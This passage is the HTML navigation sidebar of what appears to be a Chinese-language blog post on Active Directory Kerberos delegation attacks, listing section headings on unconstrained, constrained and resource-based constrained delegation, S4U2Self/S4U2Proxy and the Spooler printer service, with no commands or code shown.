class="nav-text">查询域内设置了非约束委派的机器账户</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F1"><span class="nav-number">7.9.3.</span> <span class="nav-text">非约束委派利用方式1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F2%EF%BC%88Spooler%E6%89%93%E5%8D%B0%E6%9C%BA%E6%9C%8D%E5%8A%A1%EF%BC%89"><span class="nav-number">7.9.4.</span> <span class="nav-text">非约束委派利用方式2（Spooler打印机服务）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE"><span class="nav-number">7.9.5.</span> <span class="nav-text">约束性委派</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#S4U2Self"><span class="nav-number">7.9.5.1.</span> <span class="nav-text">S4U2Self</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#S4U2Proxy"><span class="nav-number">7.9.5.2.</span> <span class="nav-text">S4U2Proxy</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E9%85%8D%E7%BD%AE%EF%BC%9A"><span class="nav-number">7.9.5.3.</span> <span class="nav-text">约束性委派配置：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E6%9C%BA%E5%99%A8%E4%B8%BB%E6%9C%BA%E9%85%8D%E7%BD%AE%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="nav-number">7.9.5.4.</span> <span class="nav-text">查询机器主机配置约束委派</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E6%9C%8D%E5%8A%A1%E8%B4%A6%E6%88%B7"><span class="nav-number">7.9.5.5.</span> <span class="nav-text">查询服务账户</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BA%A6%E6%9D%9F%E8%A1%8C%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">7.9.6.</span> <span class="nav-text">约束行委派利用方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F2-%E4%BD%BF%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7WEB%E7%9A%84hash"><span class="nav-number">7.9.7.</span> <span class="nav-text">约束性委派利用方式2(使用机器账户WEB的hash)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F3-%E4%BD%BF%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7WEB%E7%9A%84hash-%E8%BF%9C%E7%A8%8Bwmiexec"><span class="nav-number">7.9.8.</span> <span class="nav-text">约束性委派利用方式3(使用机器账户WEB的hash 远程wmiexec)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE"><span class="nav-number">7.9.9.</span> <span class="nav-text">基于资源的约束性委派</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E7%9A%84%E4%BC%98%E5%8A%BF"><span class="nav-number">7.9.9.1.</span> <span class="nav-text">基于资源的约束性委派的优势</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%92%8C%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E9%85%8D%E7%BD%AE%E7%9A%84%E5%B7%AE%E5%88%AB"><span class="nav-number">7.9.9.2.</span> <span class="nav-text">约束性委派和基于资源的约束性委派配置的差别</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B6"><span class="nav-number">7.9.9.3.</span> <span class="nav-text">条件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E7%94%A8%E6%88%B7%E8%83%BD%E5%A4%9F%E4%BF%AE%E6%94%B9msDS-AllowedToActOnBehalfOfOtherIdentity%E5%B1%9E%E6%80%A7%EF%BC%9A"><span class="nav-number">7.9.9.4.</span> <span class="nav-text">什么用户能够修改msDS-AllowedToActOnBehalfOfOtherIdentity属性：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%B0%86%E6%9C%BA%E5%99%A8%E5%8A%A0%E5%85%A5%E5%9F%9F%E7%9A%84%E5%9F%9F%E7%94%A8%E6%88%B7%EF%BC%9F"><span class="nav-number">7.9.9.5.</span> <span class="nav-text">什么是将机器加入域的域用户？</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E6%8A%8AWEB%E5%8A%A0%E5%85%A5%E5%9F%9F%E7%9A%84%E7%94%A8%E6%88%B7"><span class="nav-number">7.9.9.6.</span> <span class="nav-text">查询把WEB加入域的用户</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8"><span class="nav-number">7.9.9.7.</span> <span class="nav-text">基于资源的约束委派攻击原理及利用</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="nav-number">7.9.9.7.1.</span> <span class="nav-text">攻击原理</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8"><span class="nav-number">7.10.</span> <span class="nav-text">攻击利用</span></a></li></ol></li></ol>
     </div>
 </div>
         </aside>
